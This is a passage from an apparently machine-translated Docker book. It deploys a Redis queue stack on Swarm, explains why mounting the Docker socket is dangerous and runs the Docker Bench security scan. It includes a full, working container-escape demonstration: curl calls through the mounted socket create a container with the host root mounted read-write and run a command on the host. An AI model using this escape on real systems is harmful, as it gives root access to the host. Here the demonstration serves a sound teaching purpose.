 chown node:node $SRV_PATH
WORKDIR $SRV_PATH
USER node
COPY . $SRV_PATH/
RUN npm install
CMD ["npm", "start"]
```
我们现在将构建映像:
```
$ docker build -t queue-worker .
Sending build context to Docker daemon  7.168kB
 ---> 08e33a32ba60
Removing intermediate container e17c836c5a33
Successfully built 08e33a32ba60
Successfully tagged queue-worker:latest
```
随着映像构建的完成，我们现在可以写出我们的栈定义文件:`swarm_application.yml`。我们几乎是在一个网络上创建队列服务器、队列侦听器和队列发送器，并确保它们可以在这里找到彼此:
```
version: "3"
services:
 queue-sender:
 image: queue-worker
 command: ["npm", "start", "sender"]
 networks:
 - queue_network
 deploy:
 replicas: 1
 depends_on:
 - redis-server
 environment:
 - QUEUE_HOST=redis-server
 queue-receiver:
 image: queue-worker
 command: ["npm", "start", "receiver"]
 networks:
 - queue_network
 deploy:
 replicas: 1
 depends_on:
 - redis-server
 environment:
 - QUEUE_HOST=redis-server
 redis-server:
 image: redis
 networks:
 - queue_network
 deploy:
 replicas: 1
 networks:
 - queue_network
 ports:
 - 6379:6379
networks:
 queue_network:
```
构建好映像和栈定义后，我们可以启动队列集群，看看它是否工作:
```
$ # We need a Swarm first
$ docker swarm init
Swarm initialized: current node (c0tq34hm6u3ypam9cjr1vkefe) is now a manager.
$ # Now we deploy our stack and name it "queue_stack"
$ docker stack deploy \
               -c swarm_application.yml \
               queue_stack
Creating service queue_stack_queue-sender
Creating service queue_stack_queue-receiver
Creating service queue_stack_redis-server
$ # At this point, we should be seeing some traffic...
$ docker service logs queue_stack_queue-receiver
queue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Starting...
queue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Registering listener...
queue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Got a message from the queue with data: { key: '2017-10-02T08:24:21.391Z' }
queue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Got a message from the queue with data: { key: '2017-10-02T08:24:22.898Z' }
$ # Yay! It's working!
$ # Let's clean things up to finish up
$ docker stack rm queue_stack
Removing service queue_stack_queue-receiver
Removing service queue_stack_queue-sender
Removing service queue_stack_redis-server
Removing network queue_stack_redis-server
Removing network queue_stack_queue_network
Removing network queue_stack_service_network
$ docker swarm leave --force
Node left the swarm.
```
此时，我们可以添加任意数量的发送方和侦听器(在合理范围内)，我们的系统将以非常异步的方式正常工作，增加两端的吞吐量。不过，提醒一下，如果你决定走这条路线，强烈建议使用另一种队列类型(卡夫卡、SQS 等等)，但基本原则基本相同。
# 高级安全性
在前面的章节中，我们已经讨论了一些安全问题，但是对于一些似乎经常被忽略的问题，我们需要比文本中间的小信息框更深入地讨论它们，看看为什么它们在使用不当时会是如此大的问题。虽然实现我们在各种警告和信息框中指出的所有内容似乎需要做很多工作，但从长远来看，您向潜在入侵者提供的攻击面越小，您就越好。也就是说，除非你正在为一个政府机构部署这个系统，否则我预计会有一些妥协，但我敦促你强烈权衡每一个的利弊，否则你就有可能在午夜接到关于入侵的可怕电话。
Ironically, hardened systems usually take so much time to develop and deploy that they are often obsolete or provide marginal business value by the time they are in production environments, and due to their carefully assembled pieces, they are rarely (if ever) updated with a newer functionality, have patches applied to them quickly, or code improvements done on the source so it is a truly a double-edged sword. There is *never* a perfect solution, only a range of things you are comfortable with to some degree of dealing with. Historically, I have mostly seen horrible execution on either extremes of the fence so my advice here is that you look for a blend of the two if possible.
# 将 Docker 插座安装到容器中
这是开发人员在部署容器化解决方案时完全忽略的最严重的安全漏洞。对于与容器管理相关的各种事情，互联网上的建议通常倾向于将 Docker 套接字(`/var/run/docker.sock`)绑定安装到容器中，但很少提到的是，当您这样做时，实际上是让主机的根级访问这样的容器。由于 Docker 的套接字实际上只是一个 API 端点，Docker 守护程序作为根运行，因此容器可以简单地通过启动其他容器并在其上装载主机的系统文件夹，然后在这些容器上执行任意命令来逃避其包含。
For more information on using the Docker socket as a RESTful endpoint, you can take a look at the source code or explore a bit through the documentation for Docker Engine API at [https://docs.docker.com/engine/api/v1.31/](https://docs.docker.com/engine/api/v1.31/). The only thing you will generally need to do to use it through a tool such as `curl` is to add `--unix-socket ` and, optionally `-H "Content-Type: application/json"` for `POST` requests. Docker has been making strides at turning its service into a userspace one from a root-level one, but so far, this feature has not materialized in any practical manner. While personally I have reservations about this happening anytime soon, keep an eye out for this feature as at some point it may actually get released and become a usable feature which would be a huge step forward for container security.
有了如何误用 Docker 套接字的理论，现在我们将打破我们的容器，尽管我们将停止实际做任何损害系统的事情:
```
$ Start a "benign" container with the Docker socket mounted and run Bash
$ docker run --rm \
 -it \
 -v /var/run/docker.sock:/var/run/docker.sock \
 ubuntu /bin/bash 
root@686212135a17:/# # Sanity check - make sure that the socket is there
root@686212135a17:/# ls -la /var/run/docker.sock
srw-rw---- 1 root 136 0 Sep 20 05:03 /var/run/docker.sock
root@686212135a17:/# # Install curl but almost any other HTTP client will work
root@686212135a17:/# # Even a base Python can do this but curl is fine for brevity
root@686212135a17:/# apt-get update && apt-get install -y curl
done
root@686212135a17:/# # Create a container through the socket and bind-mount root to it
root@686212135a17:/# # with a "malicious" touch command to run
root@686212135a17:/# curl -s \
 --unix-socket /var/run/docker.sock \
 -H "Content-Type: application/json" \
 -d '{"Image": "ubuntu", "Cmd": ["touch", "/mnt/security_breach"], "Mounts": [{"Type": "bind", "Source": "/", "Target":"/mnt", "RW": true}]}' \
 -X POST \
 http:/v1.29/containers/create 
{"Id":"894c4838931767462173678aacc51c3bb98f4dffe15eaf167782513305c72558","Warnings":null}
root@686212135a17:/# # Start our escaped container
root@686212135a17:/# curl --unix-socket /var/run/docker.sock \
 -X POST \
 http:/v1.29/containers/894c4838/start
root@686212135a17:/# # Exit out of our "benign" container back to host
root@686212135a17:/# exit
exit
$ # Let's see what happened on our host
$ ls -la / | grep breach
-rw-r--r--   1 root root       0 Sep 20 23:14 security_breach 
$ # Oops!
```
现在应该很明显，良性容器只需几个命令行界面命令就能让主机扎根。虽然其中一些是基于作为根运行的容器进程，但是如果 Docker 组 ID 与容器中的非特权组冲突，也可能会发生同样的情况，但是抛开挑剔不谈，只要说在没有完全理解含义的情况下安装 Docker 套接字可能会导致非常痛苦的违规就足够了。考虑到这一点，这种技术有(尽管很少)合法的用途，所以在这里使用你最好的判断。
# 主机安全扫描
作为提高部署安全性的努力的一部分，Docker 发布了一个工具，该工具可以帮助运行名为 **Docker 安全工作台**的 Docker 引擎的主机轻松识别最常见的安全问题。该工具将扫描并验证您的配置中的大量可能的弱点，并将它们呈现在一个非常易于阅读的列表中。您可以像下载 Docker Hub 上的其他常规容器一样下载并运行此映像:
Warning! This security scan requires many permissions (`--net host`, `--pid host`, Docker socket mounting, and so on) that we have covered as generally really bad ideas to run on a host since they present a pretty large attack vector for malicious actors but on the other hand, the scan needs those permissions to check the settings you have. As such, I would highly recommend running this type of security scan on a clone of the host machine that you are trying to test in a network-isolated environment in order to prevent compromises of your infrastructure if the scanning image is maliciously modified.
```
$ docker run --rm \
 -it \
 --net host \
 --pid host \
 --cap-add audit_control \
 -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
 -v /var/lib:/var/lib \
 -v /var/run/docker.sock:/var/run/docker.sock \
 -v /usr/lib/systemd:/usr/lib/systemd \
 -v /etc:/etc \
 docker/docker-bench-security
# ------------------------------------------------------------------------------
# Docker Bench for Security v1.3.3
#
# Docker, Inc. (c) 2015-
#